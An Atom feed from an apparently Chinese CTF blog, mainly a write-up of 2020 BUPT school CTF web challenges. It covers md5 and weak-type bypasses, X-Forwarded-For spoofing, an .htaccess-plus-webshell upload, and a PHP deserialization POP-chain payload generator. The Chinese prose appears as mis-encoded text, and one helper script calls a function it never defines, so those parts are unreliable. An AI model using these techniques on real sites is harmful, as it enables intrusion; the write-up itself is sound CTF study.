<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xCreed</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0xcreed.jxustctf.top/"/>
  <updated>2020-03-28T15:28:33.923Z</updated>
  <id>https://0xcreed.jxustctf.top/</id>
  
  <author>
    <name>0xCreed</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Cæ®µæ‰«æè„šæœ¬</title>
    <link href="https://0xcreed.jxustctf.top/2020/03/C%E6%AE%B5%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/"/>
    <id>https://0xcreed.jxustctf.top/2020/03/Cæ®µæ‰«æè„šæœ¬/</id>
    <published>2020-03-28T15:28:33.000Z</published>
    <updated>2020-03-28T15:28:33.923Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
    
    <summary type="html">
    
      é™„åŠ ä¸€æ®µæ–‡ç« æ‘˜è¦ï¼Œå­—æ•°æœ€å¥½åœ¨140å­—ä»¥å†…ï¼Œä¼šå‡ºç°åœ¨metaçš„descriptioné‡Œé¢
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="tag1" scheme="https://0xcreed.jxustctf.top/tags/tag1/"/>
    
      <category term="tag2" scheme="https://0xcreed.jxustctf.top/tags/tag2/"/>
    
      <category term="tag3" scheme="https://0xcreed.jxustctf.top/tags/tag3/"/>
    
  </entry>
  
  <entry>
    <title>2020åŒ—é‚®æ ¡èµ›</title>
    <link href="https://0xcreed.jxustctf.top/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/"/>
    <id>https://0xcreed.jxustctf.top/2020/03/2020åŒ—é‚®æ ¡èµ›/</id>
    <published>2020-03-28T15:26:25.000Z</published>
    <updated>2020-04-13T12:06:32.351Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ez-bypass"><a href="#1-Ez-bypass" class="headerlink" title="1.Ez_bypass"></a>1.Ez_bypass</h3><p>æ‰“å¼€ç½‘é¡µç›´æ¥æœ‰æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                    $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">                    <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                                &#123;   <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                                    highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                                    <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>ç¬¬ä¸€å±‚md5ç»•è¿‡å¯ä»¥ç”¨æ•°ç»„æˆ–è€…<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">md5ç¢°æ’</a>,ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒç›´æ¥åœ¨1234567åé¢åŠ ä¸ªéæ•°å­—å­—ç¬¦å°±è¡Œ</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327185855883.png" alt="image-20200327185855883"></p><p>æˆ‘è¿™åŠ äº†ä¸ªç©ºæ ¼(é‚£ä¸ª0å¯ä»¥æ— è§†äº† -_-!)</p><h3 id="2-PYWebsite"><a href="#2-PYWebsite" class="headerlink" title="2.PYWebsite"></a>2.PYWebsite</h3><p>æ‰“å¼€ç½‘ç«™èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›´æ¥çœ‹æºç </p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205601093.png" alt="image-20200327205601093"></p><p>ç›´æ¥çœ‹flag.phpé¡µé¢</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205642253.png" alt="image-20200327205642253"></p><p>æ ¹æ®æç¤ºåº”è¯¥æ˜¯æ”¹XFFå¤´</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327205656797.png" alt="image-20200327205656797"></p><h3 id="3-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.ä½ ä¼ ä½ ğŸå‘¢"></a>3.ä½ ä¼ ä½ ğŸå‘¢</h3><p>è¿™é“é¢˜æœ‰è›‹ç—›çš„åœ°æ–¹æ˜¯æ­£å¸¸ä¸Šä¼ åï¼ŒæŸ¥çœ‹æŠ¥æ–‡æ˜¯NginxæœåŠ¡å™¨ï¼Œç„¶åå°±ä¸€ç›´åœ¨æuser.iniã€‚åé¢æœåŠ¡å™¨é”™è¯¯çš„å›åŒ…å‘ç°æ˜¯Apache ã€‚ã€‚ã€‚ç„¶åç›´æ¥ä¸Šä¼ .htaccessï¼Œæ–‡ä»¶å†…å®¹ï¼š SetHandler application/x-httpd-php </p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202846073.png" alt="image-20200327202846073"></p><p>æ¥ç€ä¸Šä¼ é©¬</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202924100.png" alt="image-20200327202924100"></p><p>è¿™ä¸ªé©¬æŒ‚äº†ä»£ç†æ‰è¿ä¸Š åäº†</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200327202736128.png" alt="image-20200327202736128"></p><h3 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4.Ezpop"></a>4.Ezpop</h3><p>ç›´æ¥æœ‰æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§çš„é­”æœ¯æ–¹æ³•</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__construct</span>()ï¼Œç±»çš„æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡åˆ›å»ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨(ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚</span><br><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure><p>__toString è§¦å‘çš„æ¡ä»¶æ¯”è¾ƒå¤š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™</span><br></pre></td></tr></table></figure><p>å…³é”®åœ¨<code>Modifier</code>ç±»ï¼Œå¦‚æœ$varä¸ºä¼ªåè®®é‚£ä¹ˆå¯è¯»flag.phpã€‚è¦è§¦å‘<code>Modifierçš„ __invoke()</code> å°±å¿…é¡»è§¦å‘<code>Testçš„__get()</code> ,è¦è§¦å‘<code>Testçš„__get()</code> å°±å¿…é¡»è®¿é—®<code>Testä¸­ä¸€ä¸ªä¸èƒ½è®¿é—®çš„ç±»æˆå‘˜</code> ã€‚è€Œåœ¨<code>Show</code> ä¸­çš„<code>__toSting</code> æ–¹æ³•<code>$this-&gt;str-&gt;source</code> æ˜æ˜¾æ˜¯ä¸èƒ½è®¿é—®çš„ã€‚æ‰€ä»¥æ„é€ å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var= <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str =<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span>(urlencode($b));</span><br></pre></td></tr></table></figure><h3 id="5-å¥—å¨ƒ"><a href="#5-å¥—å¨ƒ" class="headerlink" title="5.å¥—å¨ƒ"></a>5.å¥—å¨ƒ</h3><p>ç¬¬ä¸€å±‚</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143848747.png" alt="image-20200328143848747"></p><p>è¿™é‡Œç¬¬ä¸€ä¸ªä¸»è¦æ˜¯åŒ¹é…äº†<code>_</code>ï¼Œå› ä¸º$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šurldecodeæ‰€ä»¥ä¸€èˆ¬å¥—è·¯æ˜¯å¯ä»¥URLç¼–ç ï¼Œä½†æ˜¯æœ¬é¢˜ç›®banæ‰äº†<code>_</code>çš„ç¼–ç å€¼<code>%5f</code> ç»•è¿‡æ–¹æ³•ï¼š</p><ol><li>%5F</li><li>b.u.p.tï¼ˆç‚¹ä»£æ›¿_ï¼‰</li><li>b u p tï¼ˆç©ºæ ¼ä»£æ›¿_ï¼‰</li></ol><p>ç¬¬äºŒä¸ªç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328143918754.png" alt="image-20200328143918754"></p><p>è®¿é—®secrettw.phpæ²¡å•¥ç‰¹åˆ«çš„å°±æŠ“åŒ…çœ‹äº†ä¸‹</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144148256.png" alt="image-20200328144148256"></p><p>æ”¾åˆ°æ§åˆ¶å°è·‘äº†ä¸€ä¸‹</p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328144220283.png" alt="image-20200328144220283"></p><p>æœ‰äº†æç¤ºå°±å¥½åŠï¼Œä½†è¦æ³¨æ„å› ä¸ºä¹‹å‰æ˜¯æŠ“çš„GETåŒ…æ‰€ä»¥headersè¦åŠ ä¸Šcontent-typeè¿™ä¸ªå­—æ®µæˆ–è€…ç›´æ¥ç”¨Hackbar</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getè¯·æ±‚çš„headersä¸­æ²¡æœ‰content-<span class="keyword">type</span>è¿™ä¸ªå­—æ®µï¼Œpost çš„ content-<span class="keyword">type</span> æœ‰ä¸¤ç§ ï¼š</span><br><span class="line"></span><br><span class="line">application/x-www-<span class="keyword">form</span>-urlencoded </span><br><span class="line">è¿™ç§å°±æ˜¯ä¸€èˆ¬çš„æ–‡æœ¬è¡¨å•</span><br><span class="line">multipart/<span class="keyword">form</span>-<span class="keyword">data</span> </span><br><span class="line">æ–‡ä»¶è¡¨å•çš„ä¼ è¾“</span><br></pre></td></tr></table></figure><p>POST Merakåä¼šæœ‰æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$ipæ˜¯é€šè¿‡getIp()è·å–IPä½†å…·ä½“ä¸çŸ¥é“é€šè¿‡ä»€ä¹ˆåˆ¤æ–­çš„åªèƒ½çŒœäº†</p><p>1.Client-IP</p><p>2.X-Forwarded-For</p><p>3.X-Real-IP</p><p>å¯¹äºfile_get_contentså¯ä»¥åˆ©ç”¨<code>data://</code>ä¼ªåè®®ç»•è¿‡æˆ–è€…<code>php://input</code> ç»•è¿‡</p><p><code>change</code>æ”¹å˜äº†æˆ‘ä»¬ä¼ å…¥çš„fileå‚æ•°ï¼Œæ‰€ä»¥ä¼ å…¥å‰å…ˆåŠ å¯†file</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechage</span><span class="params">($v)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(unchage($a));</span><br></pre></td></tr></table></figure><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411223358460.png" alt="image-20200411223358460"></p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328233109846.png" alt="image-20200328233109846"></p><h3 id="6-Ezaudit"><a href="#6-Ezaudit" class="headerlink" title="6.Ezaudit"></a>6.Ezaudit</h3><p>ç›´æ¥æ‰«ç›®å½•ï¼Œå‘ç°æºç </p><p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411225633366.png" alt="image-20200411225633366"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 